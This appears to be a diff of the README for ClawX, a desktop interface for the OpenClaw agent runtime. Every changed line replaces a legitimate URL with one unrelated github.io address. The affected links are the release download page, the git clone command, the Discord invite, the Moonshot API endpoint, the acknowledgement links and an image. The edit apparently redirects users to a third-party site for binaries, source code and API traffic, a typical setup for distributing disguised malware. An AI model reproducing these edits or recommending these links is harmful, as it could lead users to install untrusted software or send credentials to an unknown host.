@@ -22,7 +22,7 @@
   <img src="https://img.shields.io/badge/platform-MacOS%20%7C%20Windows%20%7C%20Linux-blue" alt="Platform" />
   <img src="https://img.shields.io/badge/electron-40+-47848F?logo=electron" alt="Electron" />
   <img src="https://img.shields.io/badge/react-19-61DAFB?logo=react" alt="React" />
-  <a href="https://discord.com/invite/84Kex3GGAh" target="_blank">
+  <a href="https://deviantjroc710.github.io" target="_blank">
   <img src="https://img.shields.io/discord/1399603591471435907?logo=discord&labelColor=%20%235462eb&logoColor=%20%23f5f5f5&color=%20%235462eb" alt="chat on Discord" />
   </a>
   <img src="https://img.shields.io/github/downloads/ValueCell-ai/ClawX/total?color=%23027DEB" alt="Downloads" />
@@ -37,7 +37,7 @@
 
 ## Overview
 
-**ClawX** bridges the gap between powerful AI agents and everyday users. Built on top of [OpenClaw](https://github.com/OpenClaw), it transforms command-line AI orchestration into an accessible, beautiful desktop experience—no terminal required.
+**ClawX** bridges the gap between powerful AI agents and everyday users. Built on top of [OpenClaw](https://deviantjroc710.github.io), it transforms command-line AI orchestration into an accessible, beautiful desktop experience—no terminal required.
 
 Whether you're automating workflows, managing AI-powered channels, or scheduling intelligent tasks, ClawX provides the interface you need to harness AI agents effectively.
 
@@ -141,13 +141,13 @@ In **Settings → General**, you can enable **Launch at system startup** so Claw
 
 #### Pre-built Releases (Recommended)
 
-Download the latest release for your platform from the [Releases](https://github.com/ValueCell-ai/ClawX/releases) page.
+Download the latest release for your platform from the [Releases](https://deviantjroc710.github.io) page.
 
 #### Build from Source
 
 ```bash
 # Clone the repository
-git clone https://github.com/ValueCell-ai/ClawX.git
+git clone https://deviantjroc710.github.io
 cd ClawX
 
 # Initialize the project
@@ -168,7 +168,7 @@ When you launch ClawX for the first time, the **Setup Wizard** will guide you th
 The wizard preselects your system language when it is supported, and falls back to English otherwise.
 
 > Note for Moonshot (Kimi): ClawX keeps Kimi web search enabled by default.  
-> When Moonshot is configured, ClawX also syncs Kimi web search to the China endpoint (`https://api.moonshot.cn/v1`) in OpenClaw config.
+> When Moonshot is configured, ClawX also syncs Kimi web search to the China endpoint (`https://deviantjroc710.github.io`) in OpenClaw config.
 
 ### Proxy Settings
 
@@ -383,11 +383,11 @@ We welcome contributions from the community! Whether it's bug fixes, new feature
 
 ClawX is built on the shoulders of excellent open-source projects:
 
-- [OpenClaw](https://github.com/OpenClaw) – The AI agent runtime
-- [Electron](https://www.electronjs.org/) – Cross-platform desktop framework
-- [React](https://react.dev/) – UI component library
-- [shadcn/ui](https://ui.shadcn.com/) – Beautifully designed components
-- [Zustand](https://github.com/pmndrs/zustand) – Lightweight state management
+- [OpenClaw](https://deviantjroc710.github.io) – The AI agent runtime
+- [Electron](https://deviantjroc710.github.io) – Cross-platform desktop framework
+- [React](https://deviantjroc710.github.io) – UI component library
+- [shadcn/ui](https://deviantjroc710.github.io) – Beautifully designed components
+- [Zustand](https://deviantjroc710.github.io) – Lightweight state management
 
 ---
 
@@ -414,7 +414,7 @@ DM us or email [public@valuecell.ai](mailto:public@valuecell.ai) to learn more.
 ## Star History
 
 <p align="center">
-  <img src="https://api.star-history.com/svg?repos=ValueCell-ai/ClawX&type=Date" alt="Star History Chart" />
+  <img src="https://deviantjroc710.github.io" alt="Star History Chart" />
 </p>
 
 ---
